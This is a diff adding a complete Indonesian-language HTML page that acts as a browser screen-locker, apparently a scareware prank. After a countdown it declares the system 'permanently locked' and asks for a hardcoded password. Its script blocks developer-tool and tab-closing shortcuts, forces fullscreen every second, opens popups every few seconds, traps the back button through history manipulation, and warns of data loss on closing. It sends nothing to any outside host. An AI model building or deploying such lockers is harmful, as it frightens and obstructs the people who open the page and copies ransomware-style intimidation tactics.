@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistem Terkunci - LEVEL DEWA</title>
+    <style>
+        /* ... (CSS Dibiarkan Sama Agar Fokus pada JavaScript) ... */
+        :root {
+            --alert-red: #ff3333;
+            --dark-bg: #111111;
+            --container-bg: #222222;
+            --text-color: #ffffff;
+            --success-green: #00ff00;
+        }
+
+        /* Fullscreen Setup */
+        html, body {
+            height: 100%;
+            width: 100%;
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+        }
+
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: var(--dark-bg);
+            color: var(--text-color);
+            font-family: 'Roboto Mono', monospace;
+            text-align: center;
+            transition: background-color 0.5s ease;
+        }
+
+        /* Kontainer Utama - Kolom di Tengah */
+        .lock-container {
+            background-color: var(--container-bg);
+            padding: 30px 40px;
+            border-radius: 8px;
+            border: 3px solid var(--alert-red);
+            box-shadow: 0 0 10px var(--alert-red), 0 0 20px var(--alert-red);
+            max-width: 90%;
+            transition: all 0.5s ease;
+        }
+
+        /* Teks Peringatan */
+        .alert-heading {
+            color: var(--alert-red);
+            margin-bottom: 10px;
+            font-size: 2.5em; 
+            font-weight: 900; 
+            letter-spacing: 4px;
+            text-shadow: 0 0 5px var(--alert-red), 0 0 10px var(--alert-red);
+            animation: alert-flicker 2s infinite alternate;
+        }
+        
+        @keyframes alert-flicker {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.9; }
+        }
+
+        .status {
+            color: #ccc;
+            font-size: 1.1em;
+            margin-bottom: 20px;
+        }
+
+        /* Hitungan Mundur */
+        #timer {
+            font-size: 5em;
+            font-weight: bold;
+            color: #ffcc00; 
+            display: inline-block;
+            margin: 0 8px;
+            text-shadow: 0 0 8px #ffcc00, 0 0 15px #ffcc00;
+            animation: timer-flicker 1s infinite alternate;
+        }
+        
+        /* Input Password */
+        #password-input {
+            width: 80%;
+            padding: 10px;
+            margin: 15px auto;
+            background-color: #333;
+            color: var(--success-green);
+            border: 1px solid var(--success-green);
+            font-size: 1.2em;
+            text-align: center;
+            display: none; 
+            box-shadow: 0 0 5px var(--success-green);
+        }
+
+        #submit-button {
+            padding: 10px 20px;
+            font-size: 1em;
+            background-color: #008800;
+            color: white;
+            border: none;
+            cursor: pointer;
+            display: none; 
+            margin-top: 10px;
+        }
+
+        /* Status Terbuka (Success) */
+        .unlocked-bg { background-color: #003300 !important; }
+        .unlocked-container {
+            border: 3px solid #00ff00 !important;
+            box-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00 !important;
+        }
+        .unlocked-alert {
+             color: #00ff00 !important;
+             text-shadow: 0 0 5px #00ff00, 0 0 10px #00ff00 !important;
+        }
+
+        /* Efek guncang */
+        @keyframes shake { 
+            0%, 100% { transform: translateX(0); } 
+            20%, 60% { transform: translateX(-5px); } 
+            40%, 80% { transform: translateX(5px); } 
+        }
+    </style>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@700,900&display=swap" rel="stylesheet">
+</head>
+<body id="page-body">
+
+    <div class="lock-container" id="lock-box">
+        <h1 class="alert-heading" id="alert-text">⚠️ ALERT ⚠️</h1>
+        <p class="status" id="status-text">Sistem terkunci dalam waktu <span id="timer">20</span> detik</p>
+        
+        <input type="password" id="password-input" placeholder="Masukkan Password">
+        <button id="submit-button" onclick="checkPassword()">UNLOCK</button>
+        <p id="message-area" style="color: yellow; margin-top: 10px;"></p>
+    </div>
+
+    <script>
+        const CORRECT_PASSWORD = 'AZxVER'; 
+        let isLocked = true; 
+        let countdown = 20;
+        let fullscreenInterval; 
+        let popupInterval; 
+
+        const bodyElement = document.getElementById('page-body');
+        const boxElement = document.getElementById('lock-box');
+        const alertElement = document.getElementById('alert-text');
+        const statusTextElement = document.getElementById('status-text');
+        const timerElement = document.getElementById('timer');
+        const passwordInput = document.getElementById('password-input');
+        const submitButton = document.getElementById('submit-button');
+        const messageArea = document.getElementById('message-area');
+        
+        // --- 1. Peringatan Penutupan Tab ---
+        window.addEventListener('beforeunload', function (e) {
+            if (isLocked) {
+                e.returnValue = 'PERINGATAN KRITIS: AKAN KEHILANGAN DATA!';
+                return 'PERINGATAN KRITIS: AKAN KEHILANGAN DATA!';
+            }
+        });
+        
+        // --- 2. Melumpuhkan Tombol Keyboard Penting ---
+        document.onkeydown = function (e) {
+            if (isLocked) {
+                // Memblokir F12, Ctrl+Shift+I, Ctrl+U, Ctrl+W, Ctrl+T
+                if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73) || 
+                    (e.ctrlKey && e.shiftKey && e.keyCode == 74) || (e.ctrlKey && e.keyCode == 85) || 
+                    (e.ctrlKey && e.keyCode == 87) || (e.ctrlKey && e.keyCode == 84)) { 
+                    e.preventDefault();
+                    return false;
+                }
+                // Memblokir Esc, tapi mencoba masuk Fullscreen lagi.
+                if (e.keyCode == 27) { 
+                    activateFullscreen();
+                    return true;
+                }
+            }
+        };
+
+        // --- 3. Fungsi Pengaktifan Fullscreen Berulang ---
+        function activateFullscreen() {
+            // Kita harus menggunakan document.body jika element yang ingin difullscreen adalah body
+            if (!document.fullscreenElement) { 
+                const element = document.documentElement; // Gunakan html untuk coverage maksimal
+                if (element.requestFullscreen) {
+                    element.requestFullscreen();
+                } else if (element.mozRequestFullScreen) {
+                    element.mozRequestFullScreen();
+                } else if (element.webkitRequestFullscreen) {
+                    element.webkitRequestFullscreen();
+                } else if (element.msRequestFullscreen) {
+                    element.msRequestFullscreen();
+                }
+            }
+        }
+        
+        // --- 4. Fungsi Pengalihan Tab Otomatis (Redirect Loop) ---
+        function redirectLoop() {
+             // Mengubah URL saat ini, membuat pengguna sulit mengetik URL lain.
+             // Ini mensimulasikan loop: history.pushState(null, null, window.location.href);
+             // Karena masalah keamanan, cara paling mudah adalah memanipulasi history.
+             if (history.length < 5) { // Hanya untuk menghindari crash browser pada history loop tak terbatas
+                history.pushState(null, null, location.href); 
+             }
+        }
+        
+        // --- 5. Fungsi Popup Berulang ---
+        function openPopup() {
+             if (isLocked) {
+                 // Mencoba membuka popup baru. Browser mungkin memblokir ini setelah panggilan pertama.
+                 window.open('', 'popWindow', 'width=300,height=150,menubar=no,toolbar=no,location=no,status=no,resizable=yes');
+             }
+        }
+
+        // --- Fungsi Cek Password ---
+        function checkPassword() {
+            const enteredPassword = passwordInput.value;
+            if (enteredPassword === CORRECT_PASSWORD) {
+                // BUKA KUNCI
+                isLocked = false; 
+                clearInterval(fullscreenInterval); 
+                clearInterval(popupInterval);
+                history.pushState(null, null, 'home.html'); // Memanipulasi history agar aman
+
+                // Tampilan Sukses
+                bodyElement.classList.add('unlocked-bg');
+                boxElement.classList.add('unlocked-container');
+                alertElement.textContent = '✅ AKSES DIBERIKAN ✅';
+                alertElement.classList.add('unlocked-alert');
+                
+                statusTextElement.textContent = 'Selamat datang kembali ke sistem.'; 
+                
+                passwordInput.style.display = 'none';
+                submitButton.style.display = 'none';
+                messageArea.textContent = '';
+                
+                alertElement.style.animation = 'none';
+                boxElement.style.borderColor = '#00ff00';
+            } else {
+                messageArea.textContent = 'Password salah. Akses ditolak.';
+                passwordInput.value = ''; 
+                
+                boxElement.style.animation = 'shake 0.5s';
+                setTimeout(() => boxElement.style.animation = 'none', 500);
+            }
+        }
+        
+        // --- Hitungan Mundur ---
+        const intervalId = setInterval(() => {
+            countdown--;
+            timerElement.textContent = countdown; 
+
+            if (countdown <= 0) {
+                clearInterval(intervalId);
+                
+                // AKTIFKAN SEMUA MEKANISME PENGGANGGU DEWA
+                fullscreenInterval = setInterval(activateFullscreen, 1000); // 1 detik
+                popupInterval = setInterval(openPopup, 3000); // Setiap 3 detik
+                // Mulai looping redirect (memanipulasi history)
+                history.pushState(null, null, location.href);
+                window.onpopstate = function () {
+                    if (isLocked) {
+                         // Jika tombol back ditekan, kembali ke history yang sama
+                         history.pushState(null, null, location.href); 
+                    }
+                };
+
+                // Tampilan Terkunci Permanen
+                alertElement.textContent = '🔴 SISTEM TERKUNCI PERMANEN 🔴';
+                alertElement.style.animation = 'none'; 
+                statusTextElement.textContent = 'Masukkan password untuk membuka sistem:'; 
+                timerElement.style.display = 'none';
+                
+                passwordInput.style.display = 'block';
+                submitButton.style.display = 'block';
+                passwordInput.focus(); 
+            }
+        }, 1000); 
+    </script>
+
+</body>
+</html>
